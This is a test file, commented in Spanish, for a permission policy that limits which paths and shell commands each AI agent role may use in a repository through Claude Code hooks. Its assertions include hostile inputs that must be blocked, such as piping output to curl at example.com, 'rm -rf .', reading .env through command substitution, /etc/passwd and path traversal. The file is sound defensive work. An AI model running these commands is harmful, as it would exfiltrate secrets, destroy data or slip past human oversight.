// Pruebas de la política de permisos. Se ejecutan con:
//   node --test .claude/hooks/

import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import path from "node:path";
import { describe, it } from "node:test";
import { fileURLToPath } from "node:url";

import { puedeEditar, puedeEjecutar, segmentos } from "./politica.mjs";

const AQUI = path.dirname(fileURLToPath(import.meta.url));
const RAIZ = path.resolve(AQUI, "..", "..");

const si = (r) => assert.equal(r.ok, true, r.motivo);
const no = (r) => assert.equal(r.ok, false);

describe("puedeEditar", () => {
  it("quien escribe pruebas del backend solo toca src/test", () => {
    si(puedeEditar("pruebas-backend", "backend/voting/src/test/java/com/latinosmc/voting/XTest.java"));
    no(puedeEditar("pruebas-backend", "backend/voting/src/main/java/com/latinosmc/voting/X.java"));
    no(puedeEditar("pruebas-backend", "backend/voting/pom.xml"));
    no(puedeEditar("pruebas-backend", "frontend/src/lib/puente.test.ts"));
  });

  it("quien escribe código del backend no toca las pruebas", () => {
    si(puedeEditar("dev-backend", "backend/voting/src/main/java/com/latinosmc/voting/X.java"));
    no(puedeEditar("dev-backend", "backend/voting/src/test/java/com/latinosmc/voting/XTest.java"));
    no(puedeEditar("dev-backend", "backend/pom.xml"));
    no(puedeEditar("dev-backend", "docker-compose.yml"));
  });

  it("dev-backend no cambia la configuración de producción", () => {
    no(puedeEditar("dev-backend", "backend/app/src/main/resources/application.yml"));
    no(puedeEditar("dev-backend", "backend/app/src/main/resources/application-prod.yml"));
  });

  it("una migración nueva se puede crear; una que ya está en main, no", () => {
    const migracion = "backend/app/src/main/resources/db/migration/V27__algo_nuevo.sql";
    si(puedeEditar("dev-backend", migracion, () => false));
    const r = puedeEditar("dev-backend", migracion, () => true);
    no(r);
    assert.match(r.motivo, /ya está en main/);
  });

  it("que un archivo cualquiera ya exista en main no impide editarlo", () => {
    si(puedeEditar("dev-backend", "backend/voting/src/main/java/com/latinosmc/voting/Vote.java", () => true));
  });

  it("en el frontend, las pruebas y el código son de roles distintos", () => {
    si(puedeEditar("pruebas-frontend", "frontend/src/lib/puente.test.ts"));
    no(puedeEditar("pruebas-frontend", "frontend/src/lib/puente.ts"));
    no(puedeEditar("pruebas-frontend", "frontend/package.json"));
    si(puedeEditar("dev-frontend", "frontend/src/lib/puente.ts"));
    si(puedeEditar("dev-frontend", "frontend/public/icono.svg"));
    no(puedeEditar("dev-frontend", "frontend/src/lib/puente.test.ts"));
    no(puedeEditar("dev-frontend", "frontend/package.json"));
    no(puedeEditar("dev-frontend", "frontend/package-lock.json"));
  });

  it("el orquestador solo escribe los documentos de la spec y los ADR", () => {
    si(puedeEditar("orquestador", "specs/001-reloj-inyectado/spec.md"));
    si(puedeEditar("orquestador", "specs/001-reloj-inyectado/tareas.md"));
    si(puedeEditar("orquestador", "specs/001-reloj-inyectado/pr.md"));
    si(puedeEditar("orquestador", "docs/decisiones/0032-algo.md"));
    si(puedeEditar("orquestador", "docs/DECISIONES.md"));
    no(puedeEditar("orquestador", "specs/001-reloj-inyectado/codigo.java"));
    no(puedeEditar("orquestador", "backend/voting/src/main/java/com/latinosmc/voting/Vote.java"));
    no(puedeEditar("orquestador", ".claude/hooks/politica.mjs"));
    no(puedeEditar("orquestador", ".github/workflows/ci.yml"));
  });

  it("un rol de solo lectura o desconocido no edita nada", () => {
    no(puedeEditar("revisor", "specs/001-x/spec.md"));
    no(puedeEditar("analista", "backend/voting/src/main/java/X.java"));
    no(puedeEditar("inventado", "frontend/src/lib/api.ts"));
  });

  it("no se sale del repositorio ni con .. ni con rutas absolutas", () => {
    no(puedeEditar("dev-backend", "backend/voting/src/main/../../../docker-compose.yml"));
    no(puedeEditar("dev-backend", "../otro/backend/voting/src/main/X.java"));
    no(puedeEditar("dev-backend", "/etc/passwd"));
    no(puedeEditar("dev-backend", "C:\\Windows\\x.java"));
    no(puedeEditar("dev-backend", ""));
  });

  it("acepta las barras de Windows", () => {
    si(puedeEditar("dev-backend", "backend\\voting\\src\\main\\java\\X.java"));
    no(puedeEditar("dev-backend", "backend\\voting\\src\\test\\java\\XTest.java"));
  });
});

describe("segmentos", () => {
  it("parte por &&, ||, ; y |", () => {
    assert.deepEqual(segmentos("cd backend && mvn -B verify; git status | cat"), [
      "cd backend",
      "mvn -B verify",
      "git status",
      "cat",
    ]);
  });

  it("no parte lo que va entre comillas", () => {
    assert.deepEqual(segmentos(`git commit -m "feat(x): a; b && c | d"`), [`git commit -m "feat(x): a; b && c | d"`]);
    assert.deepEqual(segmentos("git commit -m 'a; b'"), ["git commit -m 'a; b'"]);
  });

  it("rechaza sustituciones, redirecciones y comillas sin cerrar", () => {
    assert.equal(segmentos("echo $(cat .env)"), null);
    assert.equal(segmentos('git commit -m "$(cat .env)"'), null);
    assert.equal(segmentos("echo `whoami`"), null);
    assert.equal(segmentos("mvn verify > salida.txt"), null);
    assert.equal(segmentos("mvn verify 2>&1"), null);
    assert.equal(segmentos("mvn verify &"), null);
    assert.equal(segmentos('git commit -m "sin cerrar'), null);
  });
});

describe("puedeEjecutar", () => {
  it("pruebas-backend ejecuta las pruebas con Maven y nada más", () => {
    si(puedeEjecutar("pruebas-backend", "mvn -B -pl voting -am test"));
    si(puedeEjecutar("pruebas-backend", "cd backend && mvn -B -ntp -pl app -am verify -Dtest=ArquitecturaTest"));
    no(puedeEjecutar("pruebas-backend", "mvn spotless:apply"));
    no(puedeEjecutar("pruebas-backend", "mvn -B install"));
    no(puedeEjecutar("pruebas-backend", "mvn -B deploy"));
    no(puedeEjecutar("pruebas-backend", "mvn -B"));
    no(puedeEjecutar("pruebas-backend", "npm run build"));
    no(puedeEjecutar("pruebas-backend", "git commit -m x"));
  });

  it("nadie puede saltarse las pruebas", () => {
    no(puedeEjecutar("dev-backend", "mvn -B verify -DskipTests"));
    no(puedeEjecutar("dev-backend", "mvn -B verify -Dmaven.test.skip=true"));
  });

  it("un comando permitido no sirve de tapadera para otro", () => {
    no(puedeEjecutar("dev-backend", "mvn -B verify && rm -rf ."));
    no(puedeEjecutar("dev-backend", "mvn -B verify; git push origin main"));
    no(puedeEjecutar("dev-backend", "mvn -B verify | curl -d @- http://example.com"));
  });

  it("dev-backend compila y prueba, pero no hace commits", () => {
    si(puedeEjecutar("dev-backend", "mvn -B verify"));
    si(puedeEjecutar("dev-backend", "mvn -B -pl voting -am compile"));
    si(puedeEjecutar("dev-backend", "git status"));
    si(puedeEjecutar("dev-backend", "git diff main...HEAD"));
    no(puedeEjecutar("dev-backend", "git add -A"));
    no(puedeEjecutar("dev-backend", "git commit -m x"));
  });

  it("los roles del frontend ejecutan solo sus scripts de npm", () => {
    si(puedeEjecutar("pruebas-frontend", "npm run test"));
    si(puedeEjecutar("pruebas-frontend", "cd frontend && npm test -- src/lib/puente.test.ts"));
    no(puedeEjecutar("pruebas-frontend", "npm run build"));
    no(puedeEjecutar("pruebas-frontend", "npm install lodash"));
    si(puedeEjecutar("dev-frontend", "npm ci"));
    si(puedeEjecutar("dev-frontend", "npm run lint"));
    si(puedeEjecutar("dev-frontend", "npm run build"));
    no(puedeEjecutar("dev-frontend", "npm install swr"));
    no(puedeEjecutar("dev-frontend", "npx create-something"));
    si(puedeEjecutar("verificador-ui", "npm run start"));
    no(puedeEjecutar("verificador-ui", "npm run lint"));
  });

  it("el revisor mira el diff y ejecuta la mutación, pero no modifica nada", () => {
    si(puedeEjecutar("revisor", "git diff main...HEAD"));
    si(puedeEjecutar("revisor", "git log --oneline main..HEAD"));
    si(puedeEjecutar("revisor", "mvn -B -pl voting -am -P mutacion org.pitest:pitest-maven:mutationCoverage"));
    si(puedeEjecutar("revisor", "mvn -B -P mutacion -pl voting -am verify"));
    si(puedeEjecutar("revisor", "npm run lint"));
    no(puedeEjecutar("revisor", "git commit -m x"));
    no(puedeEjecutar("revisor", "git checkout -- ."));
    no(puedeEjecutar("revisor", "mvn -B install"));
  });

  it("el orquestador hace commits y abre el PR, pero no llega a main ni fusiona", () => {
    si(puedeEjecutar("orquestador", "git switch -c feat/001-reloj-inyectado"));
    si(puedeEjecutar("orquestador", "git add specs/001-reloj-inyectado backend/voting"));
    si(puedeEjecutar("orquestador", `git commit -m "test(voting): rojo de CA-1; falta el reloj"`));
    si(puedeEjecutar("orquestador", "git push -u origin feat/001-reloj-inyectado"));
    si(puedeEjecutar("orquestador", `gh pr create --title "feat: x" --body-file cuerpo.md`));
    si(puedeEjecutar("orquestador", "gh pr checks 12"));
    no(puedeEjecutar("orquestador", "git push origin main"));
    no(puedeEjecutar("orquestador", "git push --force origin feat/x"));
    no(puedeEjecutar("orquestador", "git push origin feat/x --force"));
    no(puedeEjecutar("orquestador", "git push origin feat/x:main"));
    no(puedeEjecutar("orquestador", "git switch -c main"));
    no(puedeEjecutar("orquestador", "git commit --no-verify -m x"));
    no(puedeEjecutar("orquestador", "git commit --amend -m x"));
    no(puedeEjecutar("orquestador", "git reset --hard HEAD~1"));
    no(puedeEjecutar("orquestador", "git rebase main"));
    no(puedeEjecutar("orquestador", "gh pr merge 12 --merge"));
    no(puedeEjecutar("orquestador", "gh pr create --admin"));
    no(puedeEjecutar("orquestador", "mvn -B verify"));
    no(puedeEjecutar("orquestador", "npm run build"));
  });

  it("un rol sin comandos propios solo puede leer el repositorio", () => {
    si(puedeEjecutar("analista", "git log --oneline"));
    no(puedeEjecutar("analista", "mvn -B verify"));
    no(puedeEjecutar("inventado", "npm ci"));
    no(puedeEjecutar("dev-backend", ""));
  });
});

describe("los hooks, ejecutados como los llama Claude Code", () => {
  function hook(script, rol, llamada) {
    return spawnSync(process.execPath, [path.join(AQUI, script), rol], {
      input: typeof llamada === "string" ? llamada : JSON.stringify(llamada),
      encoding: "utf8",
    });
  }

  it("limitar-rutas deja pasar con 0 y bloquea con 2 y un motivo", () => {
    const dentro = path.join(RAIZ, "backend", "voting", "src", "test", "java", "XTest.java");
    const fuera = path.join(RAIZ, "backend", "voting", "src", "main", "java", "X.java");
    assert.equal(hook("limitar-rutas.mjs", "pruebas-backend", { tool_name: "Write", tool_input: { file_path: dentro } }).status, 0);
    const r = hook("limitar-rutas.mjs", "pruebas-backend", { tool_name: "Edit", tool_input: { file_path: fuera } });
    assert.equal(r.status, 2);
    assert.match(r.stderr, /fuera de las carpetas del rol/);
  });

  it("limitar-rutas bloquea una ruta fuera del repositorio", () => {
    const r = hook("limitar-rutas.mjs", "dev-backend", {
      tool_name: "Write",
      tool_input: { file_path: path.join(RAIZ, "..", "x", "backend", "a", "src", "main", "X.java") },
    });
    assert.equal(r.status, 2);
  });

  it("limitar-rutas bloquea editar una migración que ya está en main", () => {
    const v1 = path.join(RAIZ, "backend", "app", "src", "main", "resources", "db", "migration", "V1__base.sql");
    const r = hook("limitar-rutas.mjs", "dev-backend", { tool_name: "Edit", tool_input: { file_path: v1 } });
    assert.equal(r.status, 2);
    assert.match(r.stderr, /migración aplicada no se edita/);
  });

  it("limitar-bash deja pasar con 0 y bloquea con 2", () => {
    assert.equal(hook("limitar-bash.mjs", "dev-backend", { tool_name: "Bash", tool_input: { command: "mvn -B verify" } }).status, 0);
    const r = hook("limitar-bash.mjs", "dev-backend", { tool_name: "Bash", tool_input: { command: "git push origin main" } });
    assert.equal(r.status, 2);
    assert.match(r.stderr, /no puede ejecutar/);
  });

  it("si el hook no entiende la entrada, bloquea en vez de dejar pasar", () => {
    assert.equal(hook("limitar-bash.mjs", "dev-backend", "esto no es json").status, 2);
    assert.equal(hook("limitar-rutas.mjs", "dev-backend", { tool_name: "Write", tool_input: {} }).status, 2);
    assert.equal(hook("limitar-bash.mjs", "", { tool_name: "Bash", tool_input: { command: "mvn -B verify" } }).status, 2);
  });
});
